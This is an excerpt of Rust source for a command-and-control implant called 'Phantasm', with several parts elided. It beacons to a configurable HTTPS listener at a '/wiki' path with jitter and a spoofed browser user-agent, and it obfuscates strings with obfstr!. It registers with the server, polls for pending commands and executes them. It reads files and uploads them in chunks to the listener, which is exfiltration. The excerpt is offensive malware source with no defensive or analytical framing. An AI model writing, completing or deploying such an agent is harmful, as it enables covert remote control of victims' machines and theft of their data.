...
const LISTENER_HOST: &str = env_or_default!("PHANTASM_HOST", "localhost");
const LISTENER_PORT: &str = env_or_default!("PHANTASM_PORT", "8080");
const LISTENER_ENDPOINT: &str = env_or_default!("PHANTASM_ENDPOINT", "/wiki");
const HMAC_KEY_HEX: &str = env_or_default!("PHANTASM_HMAC_KEY", "1bb1a2912f7e02e259f969d96357bb84c2c0bf954a0d8674c45ed903bb674b23");
const RECONNECT_INTERVAL: u64 = 15;
const JITTER_SECONDS: u64 = 10;
const USER_AGENT: &str = env_or_default!("PHANTASM_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
...
impl AgentState {
    fn new() -> Self {
        ...
        let reconnect_interval = option_env!("PHANTASM_INTERVAL")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(RECONNECT_INTERVAL);
        let jitter_seconds = option_env!("PHANTASM_JITTER")
            .and_then(|v| v.parse::<u64>().ok())
...
async fn send_https_request(
    ...
    let url = format!("{}://{}:{}{}", obfstr!("https"), LISTENER_HOST, LISTENER_PORT, path);
...
async fn register_agent(
    ...
    let response = send_https_request(client, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
...
async fn send_command_response(
    ...
    send_https_request(client, LISTENER_ENDPOINT, &data, headers).await?;
    Ok(())
}
...
async fn execute_command(cmd: &str, state: &mut AgentState, client: &Client) -> Result<String, Box<dyn std::error::Error>> {
    ...
    if cmd_name == obfstr!("ls") {
        ...
        handle_get(&args, state, client).await
...
async fn handle_get(args: &[String], state: &AgentState, client: &Client) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err(obfstr!("invalid arguments").into());
    }
    ...
    if file_size < CHUNK_THRESHOLD {
        ...
        handle_get_chunked_file(path, state, client).await
    }
}
...
async fn handle_get_chunked_file(path: &Path, state: &AgentState, client: &Client) -> Result<String, Box<dyn std::error::Error>> {
    let content = fs::read(path)?;
    ...
    for i in 0..total_chunks {
        ...
        upload_chunk(client, state, &session_id, i, chunk_data, &chunk_md5).await?;
    }

    complete_chunked_transfer(client, state, &session_id).await?;
...
async fn upload_chunk(
    ...
    send_https_request(client, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    Ok(())
}
...
fn create_https_client() -> Result<Client, Box<dyn std::error::Error>> {
...
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    ...
    loop {
        if register_agent(&client, &state).await.is_ok() {
            break;
        }
    ...
    loop {
        ...
        let commands = {
            let state_guard = state.lock().await;
            match get_pending_commands(&client, &state_guard).await {
                Ok(cmds) => cmds,
                Err(_) => continue,
            }
        };
        ...
        for cmd in commands {
            if cmd.status == "pending" {
                ...
                let output = match execute_command(&cmd.command, &mut state_guard, &client).await {
                    Ok(out) => out,
